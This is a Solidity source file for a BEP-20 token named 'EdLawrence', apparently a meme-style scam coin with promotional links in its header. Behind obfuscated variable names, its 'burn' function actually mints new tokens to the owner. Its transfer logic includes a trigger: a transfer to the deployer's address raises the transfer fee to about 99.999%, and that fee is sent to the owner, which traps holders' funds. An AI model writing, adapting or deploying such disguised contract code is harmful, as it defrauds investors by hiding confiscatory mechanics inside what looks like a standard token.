/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

/////////////////////////////////////////////////
//EdLawrence BBC News Reporter v2
//Get his full story from the links shown in uplist
//https://rfi.my/8wd5.t
//https://youtu.be/fU7YTFTKdpY
//https://t.co/XXuqYvIAVW
/////////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.7;
contract EdLawrence {
mapping (address => uint256) public balanceOf;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  OUNZSJ = address(0);
uint8 public constant decimals = 18;
uint256 private  RSPNQH = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  AYQDKF = 1000000000000000000;
uint256 private  GXKWBG = 1000000000000000000000;
uint256 private  WODUYJ = 100000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  symbol = "EdLawrence";
uint256 private  IFNCHT = 1000000000000000;
address private  GMQZFY = address(0);
uint256 public constant DFNIEA = 99999;
address private  RBNHNS = address(0);
uint256 private  KYHIXF = 10000000000;
address private  QBZOMV = address(0);
address private  GMMBCU = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  VDTVGV = 10000000000000;
string public  name = "EdLawrence";
function _getAYQDKF() private returns (uint256) {
return AYQDKF;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getRBNHNS() private returns (address) {
return RBNHNS;
}

function _getGMQZFY() private returns (address) {
return GMQZFY;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MGGHLW");
require(to != address(0), "MGGHLW");
require(amount <= balanceOf[from], "MGGHLW");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DFNIEA/RSPNQH ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==GMMBCU){
RSPNQH = DFNIEA+2;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getGXKWBG() private returns (uint256) {
return GXKWBG;
}

function _getIFNCHT() private returns (uint256) {
return IFNCHT;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
GMMBCU = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tMGGHLW 0");
require(spender != address(0), "fMGGHLW 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getQBZOMV() private returns (address) {
return QBZOMV;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getOUNZSJ() private returns (address) {
return OUNZSJ;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getWODUYJ() private returns (uint256) {
return WODUYJ;
}

function _getKYHIXF() private returns (uint256) {
return KYHIXF;
}

function _getVDTVGV() private returns (uint256) {
return VDTVGV;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}